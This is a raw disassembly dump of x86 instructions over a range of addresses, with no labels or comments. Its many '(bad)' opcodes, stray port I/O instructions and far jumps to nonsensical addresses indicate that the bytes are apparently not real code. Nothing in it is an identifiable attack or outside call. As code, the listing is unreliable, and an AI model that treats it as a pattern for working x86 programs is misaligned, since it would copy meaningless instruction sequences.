  413ebd:	(bad)  
  413ebe:	ins    BYTE PTR es:[edi],dx
  413ebf:	dec    ebx
  413ec0:	and    eax,0x56514301
  413ec5:	push   es
  413ec6:	mov    al,0xb4
  413ec8:	sahf   
  413ec9:	(bad)  
  413eca:	je     0x413f0e
  413ecc:	scas   eax,DWORD PTR es:[edi]
  413ecd:	cmp    eax,0xa99088d4
  413ed2:	cwde   
  413ed3:	(bad)  
  413ed4:	call   0xd340fc7e
  413ed9:	pushf  
  413eda:	sub    al,0x81
  413edc:	adc    eax,0x2c9fa93
  413ee1:	in     eax,0x62
  413ee3:	in     al,0xe7
  413ee5:	int    0xed
  413ee7:	mov    esi,0x6c295010
  413eec:	sbb    BYTE PTR [edx],cl
  413eee:	sbb    BYTE PTR [ecx],bl
  413ef0:	xchg   edx,eax
  413ef1:	and    esp,edx
  413ef3:	mov    ebx,0xbfe69bb8
  413ef8:	mov    ah,0x9f
  413efa:	cmp    edx,DWORD PTR [esi]
  413efc:	dec    edx
  413efd:	xchg   esp,eax
  413efe:	and    cl,BYTE PTR ds:0xf6ef66c9
  413f04:	call   0x1254767f
  413f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f0a:	fwait
  413f0b:	imul   BYTE PTR [ecx+0x66]
  413f0e:	inc    ebp
  413f0f:	push   edx
  413f10:	jae    0x413ee7
  413f12:	(bad)  
  413f13:	in     al,0x62
  413f15:	mov    edi,0xe36f027a
  413f1a:	(bad)  
  413f1b:	sub    al,0x73
  413f1d:	jne    0x413f30
  413f1f:	aaa    
  413f20:	js     0x413f83
  413f22:	scas   eax,DWORD PTR es:[edi]
  413f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f24:	lds    ecx,FWORD PTR [edi]
  413f26:	cs jmp 0xae00f25c
  413f2c:	inc    ebx
  413f2d:	or     esp,ecx
  413f2f:	xor    dl,BYTE PTR [edx-0x6c51d5f0]
  413f35:	cld    
  413f36:	in     eax,dx
  413f37:	mov    ebp,0x526fe9b6
  413f3c:	imul   edi,ebx,0x60bf064b
  413f42:	cmc    
  413f43:	enter  0x2af9,0x2d
  413f47:	(bad)  
  413f48:	ins    BYTE PTR es:[edi],dx
  413f49:	pop    ecx
  413f4a:	adc    dh,dh
  413f4c:	aaa    
  413f4d:	jo     0x413f28
  413f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f50:	inc    ebx
  413f51:	ds pop ebp
  413f53:	(bad)  
  413f54:	jae    0x413f6b
  413f56:	ret    0xc431
  413f59:	mov    dh,0xc3
  413f5b:	retf   0xf35a
  413f5e:	mov    ecx,0xd033b282
  413f63:	(bad)  
  413f65:	and    bh,0x26
  413f68:	stos   DWORD PTR es:[edi],eax
  413f69:	outs   dx,DWORD PTR ds:[esi]
  413f6a:	jle    0x413fc3
  413f6c:	add    BYTE PTR [edi-0x33],ah
  413f6f:	loopne 0x413fab
  413f71:	je     0x413fa2
  413f73:	mov    esi,DWORD PTR [ebx]
  413f75:	aas    
  413f76:	dec    edx
  413f77:	(bad)  
  413f78:	into   
  413f79:	xacquire xchg DWORD PTR [esi+0x721c7061],ecx
  413f80:	mov    es,WORD PTR [ecx]
  413f82:	xor    al,0x4c
  413f84:	mov    dh,0x58
  413f86:	xor    BYTE PTR [ebp-0x6],dl
  413f89:	out    0x6c,al
  413f8b:	lea    esp,[edi+0x76]
  413f8e:	mov    ebx,0x77260e10
  413f93:	dec    ax
  413f95:	or     DWORD PTR [eax-0x7d760f79],ebx
  413f9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f9c:	mov    bh,0x13
  413f9e:	inc    eax
  413f9f:	jne    0x413fa9
  413fa1:	mov    edx,0xaedc6909
  413fa6:	xlat   BYTE PTR ds:[ebx]
  413fa7:	scas   eax,DWORD PTR es:[edi]
  413fa8:	ss mov al,0xa2
  413fab:	mov    ebx,DWORD PTR [edi+0x2f6a6abb]
  413fb1:	sub    eax,eax
  413fb3:	loopne 0x413f66
  413fb5:	in     eax,dx
  413fb6:	stc    
  413fb7:	xor    DWORD PTR [ebp+edi*4-0x7e965320],0x3b0273b3
  413fc2:	jecxz  0x413fa8
  413fc4:	mov    eax,0xb8b9c13c
  413fc9:	addr16 dec esi
  413fcb:	cmc    
  413fcc:	ret    
  413fcd:	js     0x413f71
  413fcf:	jns    0x413fc7
  413fd1:	js     0x413f67
  413fd3:	inc    edi
  413fd4:	je     0x413fe9
  413fd6:	icebp  
  413fd7:	adc    ebp,eax
  413fd9:	jnp    0x413f5b
  413fdb:	push   0xffffff9f
  413fdd:	cmp    esi,DWORD PTR [ecx]
  413fdf:	jae    0x413f91
  413fe1:	inc    esi
  413fe2:	jne    0x41400b
  413fe4:	xchg   edi,eax
  413fe5:	mov    bh,0x34
  413fe7:	xchg   esp,eax
  413fe8:	mov    eax,0x12ae2dd
  413fed:	ret    0x2c3c
  413ff0:	cmp    BYTE PTR [ebp+0x6d650272],ah
  413ff6:	pop    esp
  413ff7:	cld    
  413ff8:	xlat   BYTE PTR ds:[ebx]
  413ff9:	adc    eax,DWORD PTR [ebx-0x583b4d67]
  413fff:	out    dx,al
  414000:	cmp    cl,ah
  414002:	xchg   ecx,eax
  414003:	cmc    
  414004:	jmp    0x58fc:0x163e7f91
  41400b:	pop    ss
  41400c:	es in  al,0x85
  41400f:	xchg   BYTE PTR [esi+0x74],dl
  414012:	pushf  
  414013:	jne    0x413fe3
  414015:	inc    ebx
  414016:	retf   0x3ec1
  414019:	cs pop esp
  41401b:	and    eax,0x6079c768
  414020:	scas   eax,DWORD PTR es:[edi]
  414021:	out    dx,al
  414022:	and    ch,BYTE PTR [ebx]
  414024:	fild   WORD PTR [ecx+eax*4-0x1b]
  414028:	mov    bl,0x71
  41402a:	dec    esi
  41402b:	call   0x63aa212e
  414030:	es dec eax
  414032:	pop    ecx
  414033:	dec    ecx
  414034:	or     DWORD PTR [ebx+0x2b],0x74114bc4
  41403b:	mov    ds:0xbdad21e0,al
  414040:	rcl    al,cl
  414042:	rcr    BYTE PTR [eax+0x46595271],cl
  414048:	adc    dl,al
  41404a:	fdivr  st(5),st
  41404c:	sar    WORD PTR [ebp-0x1623d7d6],cl
  414053:	repnz adc eax,0x98161df9
  414059:	mov    ecx,gs
  41405b:	or     BYTE PTR [eax+0x5c],ch
  41405e:	cmp    cl,ah
  414060:	rcr    BYTE PTR [ebx],0x3d
  414063:	pop    edi
  414064:	clc    
  414065:	cmp    eax,0x39cf1a87
  41406a:	pop    es
  41406b:	scas   al,BYTE PTR es:[edi]
  41406c:	sbb    DWORD PTR [eax],esi
  41406e:	ds cmc 
  414070:	test   DWORD PTR [eiz*8-0x45e7d942],ecx
  414077:	outs   dx,DWORD PTR ds:[esi]
  414079:	cwde   
  41407a:	xor    cl,cl
  41407c:	push   es
  41407d:	jg     0x4140b9
  41407f:	lods   al,BYTE PTR ds:[esi]
  414080:	push   cs
  414081:	mov    ds:0xadd77a1c,al
  414086:	sbb    DWORD PTR [edx+ebp*4],0xffffffd6
  41408a:	inc    esp
  41408b:	test   al,0xce
  41408d:	rcl    DWORD PTR [ebp-0x6823125f],cl
  414093:	cmp    DWORD PTR [eax],esp
  414095:	or     DWORD PTR [edx-0x3da27542],ebx
  41409b:	jnp    0x414117
  41409d:	mov    ah,0x73
  41409f:	rcr    BYTE PTR [ebx],0x6e
  4140a2:	lahf   
  4140a3:	mov    cl,0xe6
  4140a5:	retf   
  4140a6:	xchg   ebp,eax
  4140a7:	addr16 call 0xda5d:0xa76de8c0
  4140af:	jp     0x41411e
  4140b1:	xlat   BYTE PTR ds:[ebx]
  4140b2:	sahf   
  4140b3:	cli    
  4140b4:	cmp    DWORD PTR [edx],ebx
  4140b6:	cmp    BYTE PTR gs:[edx+0x24881ad5],ah
  4140bd:	pop    ebp
  4140be:	jmp    0x519c:0xe5365d67
  4140c5:	and    ah,dl
  4140c7:	or     DWORD PTR [ecx-0x7ddbfe2d],esi
  4140cd:	xchg   DWORD PTR [edi-0x5ee63b9b],eax
  4140d3:	xor    al,0x2d
  4140d5:	pop    ecx
  4140d6:	mov    al,ds:0xa058c1f3
  4140db:	xchg   edi,eax
  4140dc:	hlt    
  4140dd:	stos   BYTE PTR es:[edi],al
  4140de:	xchg   esp,eax
  4140df:	call   0x88ef:0xc960128f
  4140e6:	jecxz  0x414120
  4140e8:	xor    al,0xca
  4140ea:	pusha  
  4140eb:	xor    cl,BYTE PTR [edx-0x4dcdf1af]
  4140f1:	dec    esi
  4140f2:	call   0x99e9:0xa15095e6
  4140f9:	imul   esp,DWORD PTR [ecx],0xffffffdc
  4140fc:	jo     0x414081
  4140fe:	data16 in al,0x7d
  414101:	xor    dh,BYTE PTR [ebx+0x714bb15f]
  414107:	sar    DWORD PTR [ebp-0x5f],cl
  41410a:	push   esi
  41410b:	mov    ds:0xb994e6c8,eax
  414110:	cmp    esp,edx
  414112:	jge    0x4140e6
  414114:	dec    esp
  414115:	jb     0x414133
  414117:	xor    BYTE PTR [eax],ch
  414119:	push   ebp
  41411a:	mov    ?,WORD PTR ds:0x95ec2158
  414120:	jno    0x414100
  414122:	mov    dh,0x6f
  414124:	fcmovne st,st(2)
  414126:	in     al,dx
  414127:	mov    ch,0x38
  414129:	mov    bl,al
  41412b:	out    dx,al
  41412c:	pop    eax
  41412d:	inc    edi
  41412e:	lahf   
  41412f:	jns    0x414169
  414131:	loopne 0x414106
  414133:	je     0x41415b
  414135:	mov    eax,0x3eea99dc
  41413a:	pop    eax
  41413b:	jo     0x41414d
  41413d:	cwde   
  41413e:	in     al,dx
  41413f:	into   
  414140:	push   0x561493db
  414145:	out    0xd8,al
  414147:	shl    BYTE PTR [edx],cl
  414149:	adc    bh,BYTE PTR [eax+ebx*8-0x40]
  41414d:	aam    0x21
  41414f:	sub    ah,BYTE PTR [edx]
  414151:	jno    0x4141c3
  414153:	push   ds
  414154:	sub    bl,cl
  414156:	scas   al,BYTE PTR es:[edi]
  414157:	loope  0x414151
  414159:	lock inc esi
  41415b:	cs addr16 test cl,cl
  41415f:	push   edi
  414160:	mov    bh,0x27
  414162:	pop    esp
  414163:	(bad)  
  414164:	call   0x64105ce8
  414169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41416a:	lods   al,BYTE PTR ds:[esi]
  41416b:	or     ch,0x5e
  41416e:	or     BYTE PTR [ebx+ebx*8-0x353529db],al
  414175:	dec    esp
  414176:	gs jbe 0x414150
  414179:	inc    ebp
  41417a:	ds push 0xd2c26006
  414180:	cmp    BYTE PTR [esi+0x37],0xbb
  414184:	outs   dx,DWORD PTR ds:[esi]
  414185:	data16 fmul QWORD PTR [edx-0x1b]
  414189:	sbb    ebx,DWORD PTR [ebx-0xfd856d7]
  41418f:	jp     0x414129
  414191:	retf   0x5b7b
  414194:	xor    eax,0x9f0da186
  414199:	out    0x61,al
  41419b:	aam    0x8c
  41419d:	ret    0xf70
  4141a0:	cdq    
  4141a1:	push   edx
  4141a2:	call   0x561b8b84
  4141a7:	mov    es,WORD PTR [eax]
  4141a9:	in     eax,0x68
  4141ab:	mov    cl,ch
  4141ad:	loop   0x4141a3
  4141af:	jbe    0x41413c
  4141b1:	cld    
  4141b2:	loope  0x4141b9
  4141b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141b5:	and    esi,DWORD PTR [edi+eiz*1-0x7e8eaee9]
  4141bc:	jmp    0xd613:0xad08c46d
  4141c3:	or     ebx,DWORD PTR [edi+0x67]
  4141c6:	lods   eax,DWORD PTR ds:[esi]
  4141c7:	mov    DWORD PTR [eax-0xd],ecx
  4141ca:	push   esi
  4141cb:	pop    ds
  4141cc:	ss js  0x414236
  4141cf:	push   edi
  4141d0:	jbe    0x4141af
  4141d2:	popf   
  4141d3:	popf   
  4141d4:	jb     0x4141ae
  4141d6:	mov    dl,0x84
  4141d8:	shr    DWORD PTR [ebx],cl
  4141da:	cmp    eax,0x550e6ca6
  4141df:	mov    al,0xf5
  4141e1:	mov    eax,0x70d7f5b7
  4141e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141e7:	add    ebp,DWORD PTR [edi-0x6981a61]
  4141ed:	rol    DWORD PTR [ecx+0x58],0xd1
  4141f1:	aad    0x35
  4141f3:	ins    DWORD PTR es:[edi],dx
  4141f4:	inc    esp
  4141f5:	outs   dx,BYTE PTR ds:[esi]
  4141f6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4141f8:	or     eax,0x7373a454
  4141fd:	fimul  WORD PTR [edx+0x1d8b1138]
  414203:	dec    edi
  414204:	mov    WORD PTR ds:0xf71d8441,es
  41420a:	mov    dl,ah
  41420c:	jb     0x41425d
  41420e:	cmp    esi,ecx
  414210:	jo     0x414261
  414212:	mov    ah,0x9
  414214:	xor    al,0xf7
  414216:	or     DWORD PTR [ecx+0xf024887],eax
  41421c:	sahf   
  41421d:	xor    al,0x92
  41421f:	dec    ecx
  414220:	and    eax,0xf52c52ff
  414225:	into   
  414226:	xor    ecx,DWORD PTR [eax]
  414228:	ss retf 
  41422a:	jo     0x41428d
  41422c:	adc    al,0xad
  41422e:	ds (bad) 
  414230:	cmp    al,0xc8
  414232:	mov    ah,0x8c
  414234:	mov    WORD PTR [edi+0x49f9b0bf],fs
  41423a:	xchg   esp,eax
  41423b:	loope  0x4141f1
  41423d:	rcr    BYTE PTR [ecx+0x48e8bded],cl
  414243:	mov    dh,0x9a
  414245:	outs   dx,DWORD PTR ds:[esi]
  414246:	pushf  
  414247:	into   
  414248:	cmp    eax,0x94272d1c
  41424d:	in     al,dx
  41424e:	lahf   
  41424f:	lock sbb al,0x28
  414252:	push   ebx
  414253:	loop   0x4141f5
  414255:	popa   
  414256:	xor    BYTE PTR [edx],0xb
  414259:	push   ebp
  41425a:	pop    esi
  41425b:	stos   BYTE PTR es:[edi],al
  41425c:	psraw  mm6,QWORD PTR [edx]
  41425f:	rcr    BYTE PTR [edi],1
  414261:	mov    al,0x78
  414263:	jecxz  0x4142a3
  414265:	mov    ds:0x3dfb636b,eax
  41426a:	enter  0x156,0xcc
  41426e:	or     ecx,DWORD PTR [edx-0x58]
  414271:	fdivr  QWORD PTR [edi+eiz*4]
  414274:	adc    DWORD PTR [ecx],ebp
  414276:	add    cl,BYTE PTR [edi]
  414278:	repz xor eax,DWORD PTR [ebx+0x3d]
  41427c:	pop    edx
  41427d:	sbb    BYTE PTR [edi+ebp*2],al
  414280:	outs   dx,DWORD PTR ds:[esi]
  414281:	xor    BYTE PTR [eax+0x6d],dh
  414284:	sbb    eax,0x617d4bc2
  414289:	mov    esp,DWORD PTR [ebx]
  41428b:	adc    eax,DWORD PTR [edx]
  41428d:	lds    edi,FWORD PTR es:[ecx+eax*8-0x5759804f]
  414295:	xchg   esi,eax
  414296:	mov    ch,0x30
  414298:	jnp    0x41428b
  41429a:	outs   dx,DWORD PTR ds:[esi]
  41429b:	xor    DWORD PTR [edx],ebx
  41429d:	xchg   ecx,eax
  41429e:	mov    cl,0xbb
  4142a0:	iret   
  4142a1:	pop    ecx
  4142a2:	aas    
  4142a3:	or     ch,ch
  4142a5:	ins    BYTE PTR es:[edi],dx
  4142a6:	je     0x4142e7
  4142a8:	cmp    al,0xf2
  4142aa:	ret    0x1c14
  4142ad:	fcmovu st,st(6)
  4142af:	mov    WORD PTR [ecx],ds
  4142b1:	(bad)  
  4142b2:	repz lock out dx,eax
  4142b5:	cmp    edx,ecx
  4142b7:	and    DWORD PTR [ecx-0x5d7e46d7],0xf16f5bb5
  4142c1:	jns    0x41431b
  4142c3:	nop
  4142c4:	ins    DWORD PTR es:[edi],dx
  4142c5:	lods   eax,DWORD PTR ds:[esi]
  4142c6:	add    eax,0x8c8b4297
  4142cb:	mov    ebx,0xe7e6968d
  4142d0:	jns    0x4142f8
  4142d2:	pop    ecx
  4142d3:	daa    
  4142d4:	or     DWORD PTR [edx],ecx
  4142d6:	push   ebp
  4142d7:	lds    esi,FWORD PTR [esi]
  4142d9:	mov    ch,0xec
  4142db:	pop    ebp
  4142dc:	or     al,0x74
  4142de:	out    0x34,al
  4142e0:	(bad)  
  4142e1:	pushf  
  4142e2:	add    DWORD PTR [ebp+0x5c],0x6f35ad4c
  4142e9:	inc    esp
  4142ea:	xchg   ecx,eax
  4142eb:	daa    
  4142ec:	sub    DWORD PTR [edx+0x35],eax
  4142ef:	adc    eax,0x3d290731
  4142f4:	pop    ebp
  4142f5:	into   
  4142f6:	jne    0x414322
  4142f8:	mov    bh,0x48
  4142fa:	aam    0xc2
  4142fc:	push   esp
  4142fd:	sbb    eax,0x1f06ba02
  414302:	imul   esi,esp,0x6c
  414305:	sahf   
  414306:	pop    esp
  414307:	xor    ch,BYTE PTR [esi-0x533ac758]
  41430d:	push   esp
  41430e:	sbb    al,0x3d
  414310:	js     0x4142ff
  414312:	(bad)  [edx+0xcd937c5]
  414318:	imul   ebp,DWORD PTR [ebx+0x48],0x1d
  41431c:	xor    BYTE PTR [ebx],0x98
  41431f:	push   ebp
  414320:	ja     0x414383
  414322:	cmp    dh,BYTE PTR [esi-0x2a]
  414325:	mov    ds:0xad2e385d,al
  41432a:	dec    edx
  41432b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41432c:	js     0x41439e
  41432e:	into   
  41432f:	push   0x24
  414331:	jp     0x4142b8
  414333:	loope  0x414395
  414335:	xchg   ecx,eax
  414336:	push   ebx
  414337:	jp     0x4142cd
  414339:	loopne 0x414346
  41433b:	stos   DWORD PTR es:[edi],eax
  41433c:	dec    edx
  41433d:	fwait
  41433e:	cmc    
  41433f:	es icebp 
  414341:	sbb    cl,BYTE PTR [edx]
  414343:	pop    ecx
  414344:	dec    ebx
  414345:	std    
  414346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414347:	jae    0x414315
  414349:	push   esi
  41434a:	sar    DWORD PTR [eax],cl
  41434c:	bound  edi,QWORD PTR [ebx+esi*8-0x40448fb5]
  414353:	or     al,0x91
  414355:	retf   
  414356:	push   es
  414357:	dec    edi
  414358:	rcr    DWORD PTR [ecx],1
  41435a:	inc    ebx
  41435b:	mov    ebx,0xd5f80efa
  414360:	mov    bh,bl
  414362:	scas   eax,DWORD PTR es:[edi]
  414363:	fld    DWORD PTR [esi-0x8ffa87a]
  414369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41436a:	retf   0xc109
  41436d:	pop    ss
  41436e:	xchg   ecx,eax
  41436f:	fcom   QWORD PTR [edi+0x59]
  414372:	mov    BYTE PTR [eax+0x493fb696],dl
  414378:	fisubr WORD PTR [ecx-0x24]
  41437b:	sbb    al,0x1
  41437d:	je     0x4143d0
  41437f:	out    dx,al
  414380:	(bad)
  414383:	xlat   BYTE PTR ds:[ebx]
  414384:	shr    bh,0x31
  414387:	lahf   
  414388:	push   ss
  414389:	jle    0x41431b
  41438b:	sti    
  41438c:	xor    ch,BYTE PTR [ebp-0x2a]
  41438f:	mov    WORD PTR [edx-0x1c],ss
  414392:	loope  0x414381
  414394:	stos   DWORD PTR es:[edi],eax
  414395:	sbb    esi,ebp
  414397:	sti    
  414398:	rcr    DWORD PTR [ebx+eiz*2-0x75f7c908],1
  41439f:	cwde   
  4143a0:	mov    WORD PTR [ecx-0x47b04389],fs
  4143a6:	(bad)  
  4143a7:	scas   eax,DWORD PTR es:[edi]
  4143a8:	loopne 0x41440a
  4143aa:	or     edi,DWORD PTR [ebx]
  4143ac:	shr    BYTE PTR [eax+0x64c739a],0x99
  4143b3:	inc    esp
  4143b4:	imul   edx,edx,0x3830a433
  4143ba:	xchg   edx,eax
  4143bb:	daa    
  4143bc:	es push ebx
  4143be:	std    
  4143bf:	cld    
  4143c0:	or     dh,BYTE PTR [ebp+edi*8+0x6f9c6df3]
  4143c7:	or     DWORD PTR [ecx],esp
  4143c9:	sbb    BYTE PTR [edx],dh
  4143cb:	cli    
  4143cc:	mov    esp,ebp
  4143ce:	sub    cl,BYTE PTR [edx-0x82db4ce]
  4143d4:	outs   dx,BYTE PTR ds:[esi]
  4143d5:	ins    DWORD PTR es:[edi],dx
  4143d6:	sub    eax,0x739441
  4143db:	stos   BYTE PTR es:[edi],al
  4143dc:	arpl   WORD PTR [edx-0x4e908b04],cx
  4143e2:	rcl    BYTE PTR ds:0x4214fd76,cl
  4143e8:	jmp    0x414429
  4143ea:	mov    dl,BYTE PTR [ebp-0xce1c543]
  4143f0:	mov    bh,0x32
  4143f2:	ss push ss
  4143f4:	jmp    0x41439d
  4143f6:	in     eax,dx
  4143f7:	sub    BYTE PTR [ecx+eiz*8+0x4c],bl
  4143fb:	xor    eax,0x8f09245d
  414400:	jb     0x414387
  414402:	data16 (bad) 
  414404:	cmc    
  414405:	aaa    
  414406:	sar    BYTE PTR [esi-0xb],1
  414409:	mov    cl,0x55
  41440b:	sbb    cl,BYTE PTR [ecx-0x6a]
  41440e:	mov    ebp,0x6baf5c84
  414413:	fst    QWORD PTR [ecx]
  414415:	mov    edx,0x341fe5cd
  41441a:	xor    ch,BYTE PTR [ebp-0x5c]
  41441d:	jae    0x41442d
  41441f:	sub    edi,DWORD PTR [edx-0x3e2e5c24]
  414425:	(bad)  
  414426:	ja     0x41445f
  414428:	xor    ecx,DWORD PTR [edi-0x59446f68]
  41442e:	int3   
  41442f:	test   dl,0xa
  414432:	cmc    
  414433:	dec    eax
  414434:	in     eax,dx
  414435:	in     al,dx
  414436:	sub    esi,DWORD PTR [ebp-0x29]
  414439:	out    0xc8,al
  41443b:	jle    0x414408
  41443d:	repnz pop ecx
  41443f:	inc    edx
  414440:	lahf   
  414441:	or     al,0x12
  414443:	sbb    edi,esi
  414445:	call   0xf21a:0xc0d39c08
  41444c:	in     eax,0xf6
  41444e:	sub    BYTE PTR [ebp-0x31],0x39
  414452:	imul   DWORD PTR [ecx+0xd]
  414455:	jmp    0x41448f
  414457:	or     bh,dl
  414459:	pop    esi
  41445a:	mov    edi,eax
  41445c:	or     eax,0x63d798a
  414461:	mov    bh,0x53
  414463:	push   eax
  414464:	xchg   ebx,eax
  414465:	pop    ss
  414466:	out    dx,al
  414467:	pop    esp
  414468:	pop    ebx
  414469:	icebp  
  41446a:	inc    edx
  41446b:	push   esp
  41446c:	in     al,0xbb
  41446e:	xchg   esp,eax
  41446f:	or     al,0x1e
  414471:	lea    esi,[ebx]
  414473:	dec    dh
  414475:	push   ebp
  414476:	fisttp DWORD PTR [ebx+0xce2b0a1]
  41447c:	inc    eax
  41447d:	inc    ecx
  41447e:	or     dl,BYTE PTR [eax-0x43]
  414481:	cmp    cl,BYTE PTR [eax-0x39a4db65]
  414487:	pop    esp
  414488:	push   ebx
  414489:	outs   dx,DWORD PTR ds:[esi]
  41448a:	int3   
  41448b:	gs nop
  41448d:	mov    esi,0x78de017e
  414492:	or     DWORD PTR [ecx],ebp
  414494:	ret    
  414495:	pop    ebp
  414496:	mov    ebx,0x71bf4a59
  41449b:	gs int 0xb
  41449e:	hlt    
  41449f:	leave  
  4144a0:	push   esp
  4144a1:	or     al,0x62
  4144a3:	push   eax
  4144a4:	jge    0x4144eb
  4144a6:	adc    DWORD PTR fs:[esi+ebp*4],edi
  4144aa:	test   al,0xc3
  4144ac:	in     al,0x19
  4144ae:	cmp    bh,BYTE PTR [esi+0x3b]
  4144b1:	repz imul ecx,ebp,0xc82fe220
  4144b8:	dec    esp
  4144b9:	mov    BYTE PTR [edi-0x7232c899],0x6d
  4144c0:	out    dx,eax
  4144c1:	retf   
  4144c2:	out    dx,al
  4144c3:	xchg   edx,eax
  4144c4:	xor    BYTE PTR [eax-0x16],dl
  4144c7:	mov    ecx,0x36759c40
  4144cc:	mov    ebp,eax
  4144ce:	xchg   esp,eax
  4144cf:	es test al,0x26
  4144d2:	dec    edi
  4144d3:	(bad)  
  4144d4:	lock dec ebx
  4144d6:	sar    BYTE PTR [ebx+0x35],cl
  4144d9:	adc    BYTE PTR [eax-0x34],bl
  4144dc:	jmp    DWORD PTR ds:0xef0fc38b
  4144e2:	lock jmp 0x414485
  4144e5:	inc    esp
  4144e6:	dec    esp
  4144e7:	mov    ebx,DWORD PTR [ebx]
  4144e9:	inc    esp
  4144ea:	cmc    
  4144eb:	in     al,dx
  4144ec:	mov    edx,0x214b23a6
  4144f1:	sbb    esi,ebx
  4144f3:	add    DWORD PTR [edx-0x367742f5],edi
  4144f9:	test   BYTE PTR [edx+0x1c],cl
  4144fc:	sti    
  4144fd:	jne    0x41450d
  4144ff:	nop
  414500:	inc    esi
  414501:	mov    cl,bl
  414503:	add    ecx,eax
  414505:	nop
  414506:	mov    edx,0x35b167a4
  41450b:	(bad)  
  41450c:	and    BYTE PTR [esi-0x3860516d],ah
  414512:	shl    BYTE PTR [ecx],0xcf
  414515:	bound  edi,QWORD PTR [eax+0x48]
  414518:	mov    ds:0x3b20691a,al
  41451d:	sbb    al,0x11
  41451f:	xor    al,0x97
  414521:	adc    BYTE PTR ss:[ecx-0x407b3184],ch
  414528:	in     eax,dx
  414529:	call   0x569a:0x20f4e491
  414530:	into   
  414531:	jo     0x41453e
  414533:	out    dx,al
  414534:	dec    ebp
  414535:	(bad)  
  414536:	and    ecx,esp
  414538:	cmp    BYTE PTR [ecx],0x71
  41453b:	dec    esi
  41453c:	fimul  DWORD PTR [esi-0x3799071c]
  414542:	ret    0x1a92
  414545:	or     cl,BYTE PTR [edi+0x4a3408a6]
  41454b:	aam    0x20
  41454d:	nop
  41454e:	stc    
  41454f:	jb     0x4144e1
  414551:	jmp    esp
  414553:	arpl   WORD PTR [ecx-0xaf3030d],bp
  414559:	lea    esi,[edi+eiz*8+0x792c4881]
  414560:	lods   eax,DWORD PTR ds:[esi]
  414561:	jmp    FWORD PTR [esi+0x7d]
  414564:	(bad)  
  414565:	enter  0x3b3,0x2f
  414569:	fst    DWORD PTR [ebp-0x1cc9509d]
  41456f:	lods   eax,DWORD PTR ds:[esi]
  414570:	cmc    
  414571:	fwait
  414572:	stos   BYTE PTR es:[edi],al
  414573:	clc    
  414574:	mov    esp,0xa5a8d3a5
  414579:	stos   DWORD PTR es:[edi],eax
  41457a:	sbb    dh,BYTE PTR [esi]
  41457c:	loopne 0x414581
  41457e:	les    eax,FWORD PTR [ebp+0x7a]
  414581:	outs   dx,BYTE PTR ds:[esi]
  414582:	rcr    dh,1
  414584:	sbb    ah,BYTE PTR ds:0x94d844b0
  41458a:	cld    
  41458b:	(bad)  
  41458c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41458d:	push   0x4a
  41458f:	ficomp DWORD PTR [esi+0x71]
  414592:	push   cs
  414593:	mov    ch,0xa
  414595:	sbb    ecx,DWORD PTR [eax]
  414597:	in     al,dx
  414598:	mov    bl,0x83
  41459a:	in     eax,0xb0
  41459c:	sub    BYTE PTR [edi-0x1e4c23fb],bh
  4145a2:	lahf   
  4145a3:	test   DWORD PTR [eiz*1-0x7b2b22a2],0xef13c5d7
  4145ae:	adc    DWORD PTR [ecx],edi
  4145b0:	hlt    
  4145b1:	inc    ebx
  4145b2:	and    DWORD PTR [edx+edx*4+0x178e1c6d],eax
  4145b9:	cdq    
  4145ba:	adc    dl,BYTE PTR [esi]
  4145bc:	mov    eax,ds:0xee3ea8d2
  4145c1:	xchg   ebp,eax
  4145c2:	pop    edx
  4145c3:	aas    
  4145c4:	int3   
  4145c5:	xor    eax,0x740f1e2d
  4145ca:	cmp    bl,ah
  4145cc:	cwde   
  4145cd:	add    edx,DWORD PTR [esi]
  4145cf:	pop    edi
  4145d0:	addr16 push edx
  4145d2:	mov    DWORD PTR [eax+0x25f4aba3],ecx
  4145d8:	mov    ecx,0xf17e0a2d
  4145dd:	sbb    al,0xaf
  4145df:	xor    eax,0x210e0a0
  4145e4:	lds    esp,FWORD PTR [ebp+eax*1+0x2]
  4145e8:	pusha  
  4145e9:	push   esi
  4145ea:	cwde   
  4145eb:	or     al,0x64
  4145ed:	dec    esi
  4145ee:	push   edx
  4145ef:	lds    ecx,FWORD PTR [esi+eiz*4+0x2288af19]
  4145f6:	jmp    0xdf5d:0xdd7029f8
  4145fd:	lods   eax,DWORD PTR ds:[esi]
  4145fe:	or     ebx,DWORD PTR [eax]
  414600:	push   0xbc5e39bf
  414605:	mov    eax,ds:0xdc8390d8
  41460a:	adc    dl,BYTE PTR [edx]
  41460c:	inc    esp
  41460d:	les    ebp,FWORD PTR [edx+0x3f8efef0]
  414613:	aad    0x5e
  414615:	xchg   esi,eax
  414616:	jne    0x414619
  414618:	xor    ebp,esi
  41461a:	test   ah,bh
  41461c:	(bad)  
  41461d:	push   ss
  41461e:	es popa 
  414620:	(bad)  
  414622:	fwait
  414623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414624:	pop    ds
  414625:	jns    0x414646
  414627:	inc    esi
  414628:	inc    ebx
  414629:	mov    eax,0x806e1b20
  41462e:	adc    al,0xdf
  414630:	gs (bad) 
  414632:	enter  0x9f67,0x78
  414636:	pop    ss
  414637:	out    dx,al
  414638:	push   esi
  414639:	sub    DWORD PTR [ecx],esi
  41463b:	push   edx
  41463c:	imul   ecx,DWORD PTR [eax+ebp*2],0xffffffed
  414640:	mov    ebp,fs
  414642:	outs   dx,DWORD PTR ds:[esi]
  414643:	pop    ebx
  414644:	out    0x98,al
  414646:	push   ss
  414647:	sub    ch,BYTE PTR ds:0xc6b29979
  41464d:	fisubr WORD PTR [esi]
  41464f:	sub    ebp,0xffffffa9
  414652:	aad    0xfd
  414654:	lods   eax,DWORD PTR ds:[esi]
  414655:	xor    BYTE PTR [ecx+0x4edd7c55],ah
  41465b:	mov    edx,0xc85dc305
  414660:	jns    0x4146a4
  414662:	pop    edx
  414663:	pop    ebp
  414664:	jnp    0x41466e
